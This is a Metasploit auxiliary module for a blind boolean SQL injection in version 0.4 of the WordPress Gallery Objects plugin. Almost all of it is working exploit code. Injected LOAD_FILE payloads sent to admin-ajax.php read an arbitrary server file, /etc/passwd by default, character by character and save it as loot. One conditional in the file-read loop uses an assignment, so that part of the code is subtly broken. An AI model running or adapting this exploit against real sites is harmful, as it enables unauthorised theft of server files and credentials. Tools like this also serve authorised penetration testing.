##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress Gallery Objects Blind SQL Injection Arbitrary File Read',
      'Description'    => %q{
      This module exploits a SQL injection in version 0.4 of Gallery Objects, a plugin for
      Wordpress. A blind boolean injection attack is used to read an arbitrary file
      off of the file system with the permissions of the SQL user.
      },
      'References'     =>
        [
          ['EDB', 'http://www.exploit-db.com/exploits/34105/']
        ],
      'Author'         =>
        [
          'bperry',
          'Claudio Viviani' #discovery
        ],
      'License'        => 'ExploitHub',
      'DisclosureDate' => "Jul 18 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to Wordpress', '/']),
        OptString.new('FILEPATH', [true, 'The filepath to read on the server', '/etc/passwd'])
      ], self.class)
  end

  def run

    file = datastore['FILEPATH'].unpack("H*")[0]

    length_length = ''
    #get the length of the length of the file
    48.upto(57) do |i|
      pay = "1 AND ORD(MID((IFNULL(CAST(CHAR_LENGTH(CAST(CHAR_LENGTH(HEX(LOAD_FILE(0x#{file}))) AS CHAR)) AS CHAR),0x20)),1,1))>#{i}"

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_get' => {
          'action' => 'go_view_object',
          'viewid' => pay,
          'type' => 'html'
        }
      })

      if res and res.body.length != 0
        length_length << i.chr
        break
      end
    end

    length_length = length_length.to_i
    length = ''

    #get length of file
    1.upto(length_length) do |i|
      48.upto(57) do |k|
        pay = "1 AND ORD(MID((IFNULL(CAST(CHAR_LENGTH(HEX(LOAD_FILE(0x#{file}))) AS CHAR),0x20)),#{i},1))>#{k}"

        res = send_request_cgi({
          'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
          'vars_get' => {
            'action' => 'go_view_object',
            'viewid' => pay,
            'type' => 'html'
          }
        })

        if res and res.body.length != 0
          length << k.chr
          break
        end
      end
    end

    data = ''
    #get file
    1.upto(length.to_i) do |i|
      [*('0'..'9'),*('A'..'F')].each do |c|
        pay = "1 AND ORD(MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{file})) AS CHAR),0x20)),#{i},1))>#{c.ord}"

        res = send_request_cgi({
          'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
          'vars_get' => {
            'action' => 'go_view_object',
            'viewid' => pay,
            'type' => 'html'
          }
        })

        if res = res.body.length != 0
          data << c
          break
        end
      end

      vprint_status([data].pack('H*')) if i%10 == 0
    end

    data = [data].pack('H*')

    path = store_loot('wordpress.file', 'binary/octet-stream', datastore['RHOST'], data, datastore['FILEPATH'])
    print_status ("File saved to #{path}.")
    print_status ("If the file is empty, the file may not exist on the server or the user does not have FILE permissions.")

  end
end

